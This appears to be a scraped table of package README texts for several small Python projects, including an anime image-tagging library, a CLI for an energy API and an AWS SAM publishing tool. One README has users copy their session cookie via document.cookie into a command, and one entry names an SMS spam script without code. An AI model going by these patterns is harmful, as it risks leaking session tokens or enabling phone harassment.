#  'short_shorts': 0.7161656618118286, 'ass_visible_through_thighs': 0.5858667492866516,
#  'black_shorts': 0.6186309456825256, 'thigh_gap': 0.41193312406539917, 'no_headwear': 0.467605859041214,
#  'low-tied_long_hair': 0.36282333731651306, 'sportswear': 0.3756745457649231, 'motion_blur': 0.5091936588287354,
#  'baseball_bat': 0.951993465423584, 'baseball': 0.5634750723838806, 'holding_baseball_bat': 0.8232709169387817}
print(chars)
# {'skadi_(arknights)': 0.9869340658187866}

rating, features, chars = get_wd14_tags('hutao.jpg')
print(rating)
# {'general': 0.49491602182388306, 'sensitive': 0.5193622708320618, 'questionable': 0.003406703472137451,
#  'explicit': 0.0007208287715911865}
print(features)
# {'1girl': 0.9798132181167603, 'solo': 0.8046203851699829, 'long_hair': 0.7596215009689331,
#  'looking_at_viewer': 0.7620116472244263, 'blush': 0.46084529161453247, 'smile': 0.48454540967941284,
#  'bangs': 0.5152207016944885, 'skirt': 0.8023070096969604, 'brown_hair': 0.8653596639633179,
#  'hair_ornament': 0.7201820611953735, 'red_eyes': 0.7816740870475769, 'long_sleeves': 0.697688639163971,
#  'twintails': 0.8974947333335876, 'school_uniform': 0.7491052746772766, 'jacket': 0.5015512704849243,
#  'flower': 0.6401398181915283, 'ahoge': 0.43420469760894775, 'pleated_skirt': 0.4528769850730896,
#  'outdoors': 0.5730487704277039, 'tongue': 0.6739872694015503, 'hair_flower': 0.5545973181724548,
#  'tongue_out': 0.6946243047714233, 'bag': 0.5487751364707947, 'symbol-shaped_pupils': 0.7439308166503906,
#  'blazer': 0.4186026453971863, 'backpack': 0.47378358244895935, ':p': 0.4690653085708618, 'ghost': 0.7565015554428101}
print(chars)
# {'hu_tao_(genshin_impact)': 0.9262397289276123, 'boo_tao_(genshin_impact)': 0.942080020904541}
```

We currently integrate the following tagging models:

* [Deepdanbooru model](https://deepghs.github.io/imgutils/main/api_doc/tagging/deepdanbooru.html), but not recommended
  for production use.
* [wd14-v2 model](https://deepghs.github.io/imgutils/main/api_doc/tagging/wd14.html#), inspired
  by [SmilingWolf/wd-v1-4-tags](https://huggingface.co/spaces/SmilingWolf/wd-v1-4-tags).

In addition, if you need to convert the dict-formatted data mentioned above into the text format required for image
training and tagging, you can also use the `tags_to_text` function (see the
link [here](https://deepghs.github.io/imgutils/main/api_doc/tagging/format.html#tags-to-text)) for formatting, as shown
below:

```python
from imgutils.tagging import tags_to_text

# a group of tags
tags = {
    'panty_pull': 0.6826801300048828,
    'panties': 0.958938717842102,
    'drinking_glass': 0.9340789318084717,
    'areola_slip': 0.41196826100349426,
    '1girl': 0.9988248348236084
}

print(tags_to_text(tags))
# '1girl, panties, drinking_glass, panty_pull, areola_slip'
print(tags_to_text(tags, use_spaces=True))
# '1girl, panties, drinking glass, panty pull, areola slip'
print(tags_to_text(tags, include_score=True))
# '(1girl:0.999), (panties:0.959), (drinking_glass:0.934), (panty_pull:0.683), (areola_slip:0.412)'
```

### Character Extraction

When we need to extract the character parts from anime images, we can use
the [`segment-rgba-with-isnetis`](https://deepghs.github.io/imgutils/main/api_doc/segment/isnetis.html#segment-rgba-with-isnetis)
function for extraction and obtain an RGBA format image (with the background part being transparent), just like the
example shown below.

![isnetis](https://deepghs.github.io/imgutils/main/_images/isnetis_trans.dat.svg)

```python
from imgutils.segment import segment_rgba_with_isnetis

mask_, image_ = segment_rgba_with_isnetis('hutao.png')
image_.save('hutao_seg.png')

mask_, image_ = segment_rgba_with_isnetis('skadi.jpg')
image_.save('skadi_seg.png')
```

This model can be found at https://huggingface.co/skytnt/anime-seg .
","# imgutils

[![PyPI](https://img.shields.io/pypi/v/dghs-imgutils)](https://pypi.org/project/dghs-imgutils/)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/dghs-imgutils)
![Loc](https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/narugo1992/8bfaa96eaa25cc9dac54debbf22d363d/raw/loc.json)
![Comments](https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/narugo1992/8bfaa96eaa25cc9dac54debbf22d363d/raw/comments.json)

[![Code Test](https://github.com/deepghs/imgutils/workflows/Code%20Test/badge.svg)](https://github.com/deepghs/imgutils/actions?query=workflow%3A%22Code+Test%22)
[![Package Release](https://github.com/deepghs/imgutils/workflows/Package%20Release/badge.svg)](https://github.com/deepghs/imgutils/actions?query=workflow%3A%22Package+Release%22)
[![codecov](https://codecov.io/gh/deepghs/imgutils/branch/main/graph/badge.svg?token=XJVDP4EFAT)](https://codecov.io/gh/deepghs/imgutils)

![GitHub Org's stars](https://img.shields.io/github/stars/deepghs)
[![GitHub stars](https://img.shields.io/github/stars/deepghs/imgutils)](https://github.com/deepghs/imgutils/stargazers)
[![GitHub forks](https://img.shields.io/github/forks/deepghs/imgutils)](https://github.com/deepghs/imgutils/network)
![GitHub commit activity](https://img.shields.io/github/commit-activity/m/deepghs/imgutils)
[![GitHub issues](https://img.shields.io/github/issues/deepghs/imgutils)](https://github.com/deepghs/imgutils/issues)
[![GitHub pulls](https://img.shields.io/github/issues-pr/deepghs/imgutils)](https://github.com/deepghs/imgutils/pulls)
[![Contributors](https://img.shields.io/github/contributors/deepghs/imgutils)](https://github.com/deepghs/imgutils/graphs/contributors)
[![GitHub license](https://img.shields.io/github/license/deepghs/imgutils)](https://github.com/deepghs/imgutils/blob/master/LICENSE)

A convenient and user-friendly anime-style image data processing library that integrates various advanced anime-style
image processing models.

## Installation

You can simply install it with `pip` command line from the official PyPI site.

```shell
pip install dghs-imgutils
```

If your operating environment includes a available GPU, you can use the following installation command to achieve higher
performance:

```shell
pip install dghs-imgutils[gpu]
```

For more information about installation, you can refer
to [Installation](https://deepghs.github.io/imgutils/main/tutorials/installation/index.html).

## Supported or Developing Features

### Tachie(差分) Detection and Clustering

For the dataset, we need to filter the differences between the tachie(差分). As shown in the following picture

![tachie](https://deepghs.github.io/imgutils/main/_images/lpips_full.dat.svg)

We can use `lpips_clustering` to cluster such situations as shown below

```python
from imgutils.metrics import lpips_clustering

images = [f'lpips/{i}.jpg' for i in range(1, 10)]
print(images)
# ['lpips/1.jpg', 'lpips/2.jpg', 'lpips/3.jpg', 'lpips/4.jpg', 'lpips/5.jpg', 'lpips/6.jpg', 'lpips/7.jpg', 'lpips/8.jpg', 'lpips/9.jpg']
print(lpips_clustering(images))  # -1 means noises, the same as that in sklearn
# [0, 0, 0, 1, 1, -1, -1, -1, -1]
```

### Monochrome Image Detection

When filtering the crawled images, we need to remove monochrome images. However, monochrome images are often not simply
composed of grayscale colors and may still contain colors, as shown by the first two rows of six images in the figure
below

![monochrome example](https://deepghs.github.io/imgutils/main/_images/monochrome.dat.svg)

We can use `is_monochrome` to determine whether an image is monochrome, as shown below:

```python
from imgutils.validate import is_monochrome

print(is_monochrome('mono/1.jpg'))  # monochrome images
# True
print(is_monochrome('mono/2.jpg'))
# True
print(is_monochrome('mono/3.jpg'))
# True
print(is_monochrome('mono/4.jpg'))
# True
print(is_monochrome('mono/5.jpg'))
# True
print(is_monochrome('mono/6.jpg'))
# True
print(is_monochrome('colored/7.jpg'))  # colored images
# False
print(is_monochrome('colored/8.jpg'))
# False
print(is_monochrome('colored/9.jpg'))
# False
print(is_monochrome('colored/10.jpg'))
# False
print(is_monochrome('colored/11.jpg'))
# False
print(is_monochrome('colored/12.jpg'))
# False
```

For more details, please refer to
the [official documentation](https://deepghs.github.io/imgutils/main/api_doc/validate/monochrome.html#module-imgutils.validate.monochrome)
.

### Truncated Image Check

The following code can be used to detect incomplete image files (such as images interrupted during the download
process):

```python
from imgutils.validate import is_truncated_file

if __name__ == '__main__':
    filename = 'test_jpg.jpg'
    if is_truncated_file(filename):
        print('This image is truncated, you\'d better '
              'remove this shit from your dataset.')
    else:
        print('This image is okay!')

```

### Image Tagging

The `imgutils` library integrates various anime-style image tagging models, allowing for results similar to the
following:

![tagging demo images](https://deepghs.github.io/imgutils/main/_images/tagging_demo.dat.svg)

The ratings, features, and characters in the image can be detected, like this:

```python
import os
from imgutils.tagging import get_wd14_tags

rating, features, chars = get_wd14_tags('skadi.jpg')
print(rating)
# {'general': 0.0011444687843322754, 'sensitive': 0.8876402974128723, 'questionable': 0.106781005859375, 'explicit': 0.000277101993560791}
print(features)
# {'1girl': 0.997527003288269, 'solo': 0.9797663688659668, 'long_hair': 0.9905703663825989, 'breasts': 0.9761719703674316,
#  'looking_at_viewer': 0.8981098532676697, 'bangs': 0.8810765743255615, 'large_breasts': 0.9498510360717773,
#  'shirt': 0.8377365469932556, 'red_eyes': 0.945058286190033, 'gloves': 0.9457170367240906, 'navel': 0.969594419002533,
#  'holding': 0.7881088852882385, 'hair_between_eyes': 0.7687551379203796, 'very_long_hair': 0.9301245212554932,
#  'standing': 0.6703325510025024, 'white_hair': 0.5292627811431885, 'short_sleeves': 0.8677047491073608,
#  'grey_hair': 0.5859264731407166, 'thighs': 0.9536856412887573, 'cowboy_shot': 0.8056888580322266,
#  'sweat': 0.8394746780395508, 'outdoors': 0.9473626613616943, 'parted_lips': 0.8986269235610962,
#  'sky': 0.9385137557983398, 'shorts': 0.8408567905426025, 'alternate_costume': 0.4245271384716034,
#  'day': 0.931140661239624, 'black_gloves': 0.8830795884132385, 'midriff': 0.7279844284057617,
#  'artist_name': 0.5333830714225769, 'cloud': 0.64717698097229, 'stomach': 0.9516432285308838,
#  'blue_sky': 0.9655293226242065, 'crop_top': 0.9485014081001282, 'black_shirt': 0.7366660833358765,
#  'short_shorts': 0.7161656618118286, 'ass_visible_through_thighs': 0.5858667492866516,
#  'black_shorts': 0.6186309456825256, 'thigh_gap': 0.41193312406539917, 'no_headwear': 0.467605859041214,
#  'low-tied_long_hair': 0.36282333731651306, 'sportswear': 0.3756745457649231, 'motion_blur': 0.5091936588287354,
#  'baseball_bat': 0.951993465423584, 'baseball': 0.5634750723838806, 'holding_baseball_bat': 0.8232709169387817}
print(chars)
# {'skadi_(arknights)': 0.9869340658187866}

rating, features, chars = get_wd14_tags('hutao.jpg')
print(rating)
# {'general': 0.49491602182388306, 'sensitive': 0.5193622708320618, 'questionable': 0.003406703472137451,
#  'explicit': 0.0007208287715911865}
print(features)
# {'1girl': 0.9798132181167603, 'solo': 0.8046203851699829, 'long_hair': 0.7596215009689331,
#  'looking_at_viewer': 0.7620116472244263, 'blush': 0.46084529161453247, 'smile': 0.48454540967941284,
#  'bangs': 0.5152207016944885, 'skirt': 0.8023070096969604, 'brown_hair': 0.8653596639633179,
#  'hair_ornament': 0.7201820611953735, 'red_eyes': 0.7816740870475769, 'long_sleeves': 0.697688639163971,
#  'twintails': 0.8974947333335876, 'school_uniform': 0.7491052746772766, 'jacket': 0.5015512704849243,
#  'flower': 0.6401398181915283, 'ahoge': 0.43420469760894775, 'pleated_skirt': 0.4528769850730896,
#  'outdoors': 0.5730487704277039, 'tongue': 0.6739872694015503, 'hair_flower': 0.5545973181724548,
#  'tongue_out': 0.6946243047714233, 'bag': 0.5487751364707947, 'symbol-shaped_pupils': 0.7439308166503906,
#  'blazer': 0.4186026453971863, 'backpack': 0.47378358244895935, ':p': 0.4690653085708618, 'ghost': 0.7565015554428101}
print(chars)
# {'hu_tao_(genshin_impact)': 0.9262397289276123, 'boo_tao_(genshin_impact)': 0.942080020904541}
```

We currently integrate the following tagging models:

* [Deepdanbooru model](https://deepghs.github.io/imgutils/main/api_doc/tagging/deepdanbooru.html), but not recommended
  for production use.
* [wd14-v2 model](https://deepghs.github.io/imgutils/main/api_doc/tagging/wd14.html#), inspired
  by [SmilingWolf/wd-v1-4-tags](https://huggingface.co/spaces/SmilingWolf/wd-v1-4-tags).

In addition, if you need to convert the dict-formatted data mentioned above into the text format required for image
training and tagging, you can also use the `tags_to_text` function (see the
link [here](https://deepghs.github.io/imgutils/main/api_doc/tagging/format.html#tags-to-text)) for formatting, as shown
below:

```python
from imgutils.tagging import tags_to_text

# a group of tags
tags = {
    'panty_pull': 0.6826801300048828,
    'panties': 0.958938717842102,
    'drinking_glass': 0.9340789318084717,
    'areola_slip': 0.41196826100349426,
    '1girl': 0.9988248348236084
}

print(tags_to_text(tags))
# '1girl, panties, drinking_glass, panty_pull, areola_slip'
print(tags_to_text(tags, use_spaces=True))
# '1girl, panties, drinking glass, panty pull, areola slip'
print(tags_to_text(tags, include_score=True))
# '(1girl:0.999), (panties:0.959), (drinking_glass:0.934), (panty_pull:0.683), (areola_slip:0.412)'
```

### Character Extraction

When we need to extract the character parts from anime images, we can use
the [`segment-rgba-with-isnetis`](https://deepghs.github.io/imgutils/main/api_doc/segment/isnetis.html#segment-rgba-with-isnetis)
function for extraction and obtain an RGBA format image (with the background part being transparent), just like the
example shown below.

![isnetis](https://deepghs.github.io/imgutils/main/_images/isnetis_trans.dat.svg)

```python
from imgutils.segment import segment_rgba_with_isnetis

mask_, image_ = segment_rgba_with_isnetis('hutao.png')
image_.save('hutao_seg.png')

mask_, image_ = segment_rgba_with_isnetis('skadi.jpg')
image_.save('skadi_seg.png')
```

This model can be found at https://huggingface.co/skytnt/anime-seg .
",deepghs/imgutils
bibomber,https://github.com/bikmeev/bi_bomber,0,30,30,"BI Boomber

sms spamer script
","BI Boomber

sms spamer script
",bikmeev/bi_bomber
loadingbar-py-diggs,https://github.com/VHollund/LoadingBar,0,325,325,"# LoadingBar.Py
### The simplest loadingbar i could think of.
By Vetle Hollund

## Usage


```python
pip install LoadingBar_Py_Diggs
```

## Example
```python
from loadingbar import LoadingBar

if __name__ == '__main__':
    k=LoadingBar(20, ""█"")
    for x in range(0, 101):
        k.update(x)
        time.sleep(0.1)
```


","# LoadingBar.Py
### The simplest loadingbar i could think of.
By Vetle Hollund

## Usage


```python
pip install LoadingBar_Py_Diggs
```

## Example
```python
from loadingbar import LoadingBar

if __name__ == '__main__':
    k=LoadingBar(20, ""█"")
    for x in range(0, 101):
        k.update(x)
        time.sleep(0.1)
```


",vhollund/loadingbar
enerbitdso,https://github.com/enerBit/enerbitdso,7,4668,4668,"
```txt
███████╗██████╗     ██████╗ ███████╗ ██████╗ 
██╔════╝██╔══██╗    ██╔══██╗██╔════╝██╔═══██╗
█████╗  ██████╔╝    ██║  ██║███████╗██║   ██║
██╔══╝  ██╔══██╗    ██║  ██║╚════██║██║   ██║
███████╗██████╔╝    ██████╔╝███████║╚██████╔╝
╚══════╝╚═════╝     ╚═════╝ ╚══════╝ ╚═════╝ 
                                             
```

# Introducción

Un programa de línea de comandos para preparar y empujar reportes de lectura desde el api de enerBit al MDM.

Se distribuye como un paquete de Python ejecutable.

# Como empezar

## Instalación

1. Crear un ambiente virtual de Python para aislar la instalación del paquete de otros paquetes.

```sh
python3 -m venv venv
source ./venv/bin/activate
```

1. Instalar paquete usando pip (asegurarse de tener activo el ambiente virtual).

```sh
python -m pip install .
```

1. Comprobar la instalación con el comando de ayuda

```sh
enerbitdso --help
```

# Uso

El comando es `enerbitdso`.

Se tiene una ayuda usando la opción `--help`.
Esta explica los sub-comandos y las opciones disponibles de cada uno.

Esta herramienta usa las variables de entorno para configurar su ejecución.

## Sub-comandos

### `enerbitdso usages fetch`

Consulta los consumos usando el API para DSO de enerBit para un conjunto de fronteras.

#### Variables de entorno **requeridas**

Para ejecutar este sub-comando se requieren tres variables de entorno configuradas con sus respectivos valores.

- ENERBIT_API_BASE_URL: La URL base del API del DSO, su valor debe ser `https://dso.enerbit.me/`
- ENERBIT_API_USERNAME: El nombre de usuario para autenticarse contra el API, ejemplo: `pedro.perez@example.com`
- ENERBIT_API_PASSWORD: La contraseña del usuario para autenticarse, ejemplo: `mIClaVeSUperseCRETa`

Para configurar estas variables de entorno se pueden ejecutar los siguientes comandos en la terminal:

```powershell
$env:ENERBIT_API_BASE_URL = 'https://dso.enerbit.me/'
$env:ENERBIT_API_BASE_URL = 'NOMBRE DE USUARIO'
$env:ENERBIT_API_BASE_URL = 'CONTRASEÑA DE USUARIO'
```

#### Especificación de fronteras a consultar

Las fronteras a consultar se pueden especificar como una lista al final del comando separadas por espacios:

```
> enerbitdso usages fetch Frt00000 Frt00001
```

También se puede usar un archivo de texto con un código de frontera por línea usando la opción `--frt-file` y pasando la ubicación de dicho archivo.

```powershell
> enerbitdso usages fetch --frt-file ""D://Mi CGM/misfronteras.txt""
```

#### Especificación de intervalo de tiempo para la consulta

El intervalo de tiempo se define a través de los parámetros de tipo fecha `--since` y `--until` (desde y hasta, respectivamente).
*Por defecto*, se consultan los 24 periodos del día de ayer.

Para consultar los periodos entre 2023-04-01 a las 09:00 y el 2023-04-05 a las 17:00:

```
> enerbitdso usages fetch Frt00000 Frt00001
```

#### Opción de ayuda

También tiene opción `--help` que muestra la ayuda particular de este sub-comando.

```powershell
> enerbitdso usages fetch --help

 Usage: enerbitdso usages fetch [OPTIONS] [FRTS]...

╭─ Arguments ────────────────────────────────────────────────────────────────────────────────────────────────────╮
│   frts      [FRTS]...  List of frt codes separated by ' ' [default: None]                                      │
╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─ Options ──────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ *  --api-base-url        TEXT               [env var: ENERBIT_API_BASE_URL] [default: None] [required]         │
│ *  --api-username        TEXT               [env var: ENERBIT_API_USERNAME] [default: None] [required]         │
│ *  --api-password        TEXT               [env var: ENERBIT_API_PASSWORD] [default: None] [required]         │
│    --since               [%Y-%m-%d|%Y%m%d]  [default: (yesterday)]                                             │
│    --until               [%Y-%m-%d|%Y%m%d]  [default: (today)]                                                 │
│    --timezone            TEXT               [default: America/Bogota]                                          │
│    --out-format          [csv|jsonl]        Output file format [default: jsonl]                                │
│    --frt-file            PATH               Path file with one frt code per line [default: None]               │
│    --help                                   Show this message and exit.                                        │
╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
```
","
```txt
███████╗██████╗     ██████╗ ███████╗ ██████╗ 
██╔════╝██╔══██╗    ██╔══██╗██╔════╝██╔═══██╗
█████╗  ██████╔╝    ██║  ██║███████╗██║   ██║
██╔══╝  ██╔══██╗    ██║  ██║╚════██║██║   ██║
███████╗██████╔╝    ██████╔╝███████║╚██████╔╝
╚══════╝╚═════╝     ╚═════╝ ╚══════╝ ╚═════╝ 
                                             
```

# Introducción

Un programa de línea de comandos para preparar y empujar reportes de lectura desde el api de enerBit al MDM.

Se distribuye como un paquete de Python ejecutable.

# Como empezar

## Instalación

1. Crear un ambiente virtual de Python para aislar la instalación del paquete de otros paquetes.

```sh
python3 -m venv venv
source ./venv/bin/activate
```

1. Instalar paquete usando pip (asegurarse de tener activo el ambiente virtual).

```sh
python -m pip install .
```

1. Comprobar la instalación con el comando de ayuda

```sh
enerbitdso --help
```

# Uso

El comando es `enerbitdso`.

Se tiene una ayuda usando la opción `--help`.
Esta explica los sub-comandos y las opciones disponibles de cada uno.

Esta herramienta usa las variables de entorno para configurar su ejecución.

## Sub-comandos

### `enerbitdso usages fetch`

Consulta los consumos usando el API para DSO de enerBit para un conjunto de fronteras.

#### Variables de entorno **requeridas**

Para ejecutar este sub-comando se requieren tres variables de entorno configuradas con sus respectivos valores.

- ENERBIT_API_BASE_URL: La URL base del API del DSO, su valor debe ser `https://dso.enerbit.me/`
- ENERBIT_API_USERNAME: El nombre de usuario para autenticarse contra el API, ejemplo: `pedro.perez@example.com`
- ENERBIT_API_PASSWORD: La contraseña del usuario para autenticarse, ejemplo: `mIClaVeSUperseCRETa`

Para configurar estas variables de entorno se pueden ejecutar los siguientes comandos en la terminal:

```powershell
$env:ENERBIT_API_BASE_URL = 'https://dso.enerbit.me/'
$env:ENERBIT_API_BASE_URL = 'NOMBRE DE USUARIO'
$env:ENERBIT_API_BASE_URL = 'CONTRASEÑA DE USUARIO'
```

#### Especificación de fronteras a consultar

Las fronteras a consultar se pueden especificar como una lista al final del comando separadas por espacios:

```
> enerbitdso usages fetch Frt00000 Frt00001
```

También se puede usar un archivo de texto con un código de frontera por línea usando la opción `--frt-file` y pasando la ubicación de dicho archivo.

```powershell
> enerbitdso usages fetch --frt-file ""D://Mi CGM/misfronteras.txt""
```

#### Especificación de intervalo de tiempo para la consulta

El intervalo de tiempo se define a través de los parámetros de tipo fecha `--since` y `--until` (desde y hasta, respectivamente).
*Por defecto*, se consultan los 24 periodos del día de ayer.

Para consultar los periodos entre 2023-04-01 a las 09:00 y el 2023-04-05 a las 17:00:

```
> enerbitdso usages fetch Frt00000 Frt00001
```

#### Opción de ayuda

También tiene opción `--help` que muestra la ayuda particular de este sub-comando.

```powershell
> enerbitdso usages fetch --help

 Usage: enerbitdso usages fetch [OPTIONS] [FRTS]...

╭─ Arguments ────────────────────────────────────────────────────────────────────────────────────────────────────╮
│   frts      [FRTS]...  List of frt codes separated by ' ' [default: None]                                      │
╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─ Options ──────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ *  --api-base-url        TEXT               [env var: ENERBIT_API_BASE_URL] [default: None] [required]         │
│ *  --api-username        TEXT               [env var: ENERBIT_API_USERNAME] [default: None] [required]         │
│ *  --api-password        TEXT               [env var: ENERBIT_API_PASSWORD] [default: None] [required]         │
│    --since               [%Y-%m-%d|%Y%m%d]  [default: (yesterday)]                                             │
│    --until               [%Y-%m-%d|%Y%m%d]  [default: (today)]                                                 │
│    --timezone            TEXT               [default: America/Bogota]                                          │
│    --out-format          [csv|jsonl]        Output file format [default: jsonl]                                │
│    --frt-file            PATH               Path file with one frt code per line [default: None]               │
│    --help                                   Show this message and exit.                                        │
╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
```
",enerbit/enerbitdso
hoyo-daily-logins-helper,https://github.com/atomicptr/hoyo-daily-logins-helper,4,1176,1176,"# hoyo-daily-login-helper

Get hoyo daily login rewards automatically!

## Usage

1. Get your cookie string, open the daily check in page
   * [Daily Check-in page for Genshin](https://act.hoyolab.com/ys/event/signin-sea-v3/index.html?act_id=e202102251931481)
   * [Daily Check-in page for Star Rail](https://act.hoyolab.com/bbs/event/signin/hkrpg/index.html?act_id=e202303301540311)
2. Open a development console (F12) and insert the following code:
    ```javascript
    document.cookie
    ```
3. Copy the returned string should be something like ""ltoken=....; account_id=....;"" this is your cookie string
4. Open a terminal with the command prepared and enter:
    ```bash
    $ hoyo-daily-logins-helper --cookie=""your cookie string"" --genshin
    ```
   (or ``--starrail`` for Honkai Star Rail)
5. Done!

### Docker

The command line options are also available via environment variables which
allows you to easily run this script in Docker/Podman!

```bash
$ docker run --rm --env GAME=starrail --env COOKIE=""your cookie string"" ghcr.io/atomicptr/hoyo-daily-logins-helper
```

## License

GNU General Public License v3

![](https://www.gnu.org/graphics/gplv3-127x51.png)
","# hoyo-daily-login-helper

Get hoyo daily login rewards automatically!

## Usage

1. Get your cookie string, open the daily check in page
   * [Daily Check-in page for Genshin](https://act.hoyolab.com/ys/event/signin-sea-v3/index.html?act_id=e202102251931481)
   * [Daily Check-in page for Star Rail](https://act.hoyolab.com/bbs/event/signin/hkrpg/index.html?act_id=e202303301540311)
2. Open a development console (F12) and insert the following code:
    ```javascript
    document.cookie
    ```
3. Copy the returned string should be something like ""ltoken=....; account_id=....;"" this is your cookie string
4. Open a terminal with the command prepared and enter:
    ```bash
    $ hoyo-daily-logins-helper --cookie=""your cookie string"" --genshin
    ```
   (or ``--starrail`` for Honkai Star Rail)
5. Done!

### Docker

The command line options are also available via environment variables which
allows you to easily run this script in Docker/Podman!

```bash
$ docker run --rm --env GAME=starrail --env COOKIE=""your cookie string"" ghcr.io/atomicptr/hoyo-daily-logins-helper
```

## License

GNU General Public License v3

![](https://www.gnu.org/graphics/gplv3-127x51.png)
",atomicptr/hoyo-daily-logins-helper
xlttbc,https://github.com/dgoeries/lttbc/,1,0,0,,,dgoeries/lttbc
rum-with-telegram,https://github.com/liujuanjuan1984/rum_with_telegram,5,21,21,"# rum_with_telegram
","# rum_with_telegram
",liujuanjuan1984/rum_with_telegram
sam-publish,https://github.com/peterjdavis/sam-publish,7,5318,5318,"# Overview
If you author an [AWS Serverless Application Model (SAM)](https://aws.amazon.com/serverless/sam/) template you may wish to publish this as an [AWS CloudFormation](https://docs.aws.amazon.com/cloudformation/index.html) template to allow the user to deploy the solution from the console and remove the need for the user to install the [AWS SAM CLI](https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/install-sam-cli.html).

Much of this can be achieved by using commands such as `sam package` to package your template and upload the assets to S3 and [aws-sam-translator](https://pypi.org/project/aws-sam-translator/) to transform the SAM template into a AWS CloudFormation template.  sam-publish allows you to further transform your CloudFormation template in three ways:
* Inlining of [AWS Lambda](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html) functions into the CloudFormation template to allow the user to the see the functions in the main template
* Control of the buckets where the assets are stored e.g. [AWS Step Functions](https://aws.amazon.com/step-functions/) and [Lambda Layers](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html).  The can be useful if you would like to deploy the assets to a separate AWS account which may have publicly accessible buckets available specifically for sharing assets with users.
* Removes the metadata and tags that are added to resources when converted using [aws-sam-translator](https://pypi.org/project/aws-sam-translator/)

# Command Line Arguments

  `--working-folder WORKING_FOLDER` - Working folder for the input and output files.  Normally a local temp folder.
  
  `--cfn-input-template CFN_INPUT_TEMPLATE` - Name of JSON template to transform [default: template.json].  Normally the output from `sam package` command
   
   `--cfn-output-template CFN_OUTPUT_TEMPLATE` - Name of YAML template to output [default: template.yaml].

  `--target-asset-folder TARGET_ASSET_FOLDER` - Local folder the assets should be stored [default: ./Assets/].

  `--lambda-folder LAMBDA_FOLDER` - Location the lambda assets should be stored, this is appended to the target-asset-folder [default: lambda].

  `--layer-folder LAYER_FOLDER` - Location the layer assets should be stored, this is appended to the target-asset-folder [default: layer].

  `--statemachine-folder STATEMACHINE_FOLDER` - Location the statemachine assets should be stored, this is appended to the target-asset-folder [default: statemachine].

  `--target-asset-bucket TARGET_ASSET_BUCKET` - Bucket the assets will be stored in.  This is used update the references in the CloudFormation template.  The assets are not actually copied to this bucket.  Typically this will be done using an `aws s3 sync` command

  `--target-prefix TARGET_PREFIX` - Prefix that should be applied to the updated references in the CloudFormation template if the assets are not going to uploaded to the root [default: ''].

  `--move-assets` - Should references to the assets in the CloudFormation template be updated to a different bucket [default: False]

  `--tidy-tags-metadata` - Should SAM tags and metadata be tidied up [Default: True]?

  `--add-layout-gaps` - Should a new line be added between each resource for readability [Default: True]?

  `--debug` - Enables debug logging [Default: False]

  `--verbose` - Enables verbose logging [Default: True]

# Example uses

Assuming that you have a SAM Template in the current folder e.g. https://github.com/peterjdavis/sam-publish/blob/main/samples/sam-template.yaml then the following commands could be used to transform this to the CloudFormation template shown at https://github.com/peterjdavis/sam-publish/blob/main/samples/cfn-template.yaml
```bash
#!/bin/bash

# Create a virtual environment
python3 -m venv .venv
source .venv/bin/activate

# Install sam-publish
pip3 install sam-publish

# Get some environment variables
AWSAccount=$(aws sts get-caller-identity --query Account --output text)
AWSRegion=$(aws configure get region)
export tmpCFNDir=$(mktemp -d)

# Build the SAM project
sam build -t sam-template.yaml

# Check to make sure the bucket for the SAM assets exists
if aws s3api head-bucket --bucket sam-${AWSAccount}-${AWSRegion} 2>/dev/null; \
    then echo Bucket sam-${AWSAccount}-${AWSRegion} exists; \
    else echo Creating bucket sam-${AWSAccount}-${AWSRegion} && \
        aws s3 mb s3://sam-${AWSAccount}-${AWSRegion} --region ${AWSRegion} ; \
    fi

# Package the SAM template so the assets are available in the s3 bucket and teh updated template is available
sam package -t sam-template.yaml \
            --output-template-file ${tmpCFNDir}/sam-template.tmp.yaml \
            --s3-bucket sam-${AWSAccount}-${AWSRegion} 

# Update the CloudFormation tempalte so lambda's with an InlineSAMFunction: true metadata tag are inlined
# assets are referenced from a parameter call AssetBucket and the layer and lambda are referenced from a default prefix
sam-publish \
    --working-folder ${tmpCFNDir} \
    --cfn-input-template ${tmpCFNDir}/sam-template.tmp.yaml \
    --cfn-output-template cfn-template.yaml \
    --target-asset-folder assets/cfn \
    --target-asset-bucket AssetBucket \
    --move-assets \
    --verbose

# Tidy up the temporary folder
rm -rf ${tmpCFNDir}
```
","# Overview
If you author an [AWS Serverless Application Model (SAM)](https://aws.amazon.com/serverless/sam/) template you may wish to publish this as an [AWS CloudFormation](https://docs.aws.amazon.com/cloudformation/index.html) template to allow the user to deploy the solution from the console and remove the need for the user to install the [AWS SAM CLI](https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/install-sam-cli.html).

Much of this can be achieved by using commands such as `sam package` to package your template and upload the assets to S3 and [aws-sam-translator](https://pypi.org/project/aws-sam-translator/) to transform the SAM template into a AWS CloudFormation template.  sam-publish allows you to further transform your CloudFormation template in three ways:
* Inlining of [AWS Lambda](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html) functions into the CloudFormation template to allow the user to the see the functions in the main template
* Control of the buckets where the assets are stored e.g. [AWS Step Functions](https://aws.amazon.com/step-functions/) and [Lambda Layers](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html).  The can be useful if you would like to deploy the assets to a separate AWS account which may have publicly accessible buckets available specifically for sharing assets with users.
* Removes the metadata and tags that are added to resources when converted using [aws-sam-translator](https://pypi.org/project/aws-sam-translator/)

# Command Line Arguments

  `--working-folder WORKING_FOLDER` - Working folder for the input and output files.  Normally a local temp folder.
  
  `--cfn-input-template CFN_INPUT_TEMPLATE` - Name of JSON template to transform [default: template.json].  Normally the output from `sam package` command
   
   `--cfn-output-template CFN_OUTPUT_TEMPLATE` - Name of YAML template to output [default: template.yaml].

  `--target-asset-folder TARGET_ASSET_FOLDER` - Local folder the assets should be stored [default: ./Assets/].

  `--lambda-folder LAMBDA_FOLDER` - Location the lambda assets should be stored, this is appended to the target-asset-folder [default: lambda].

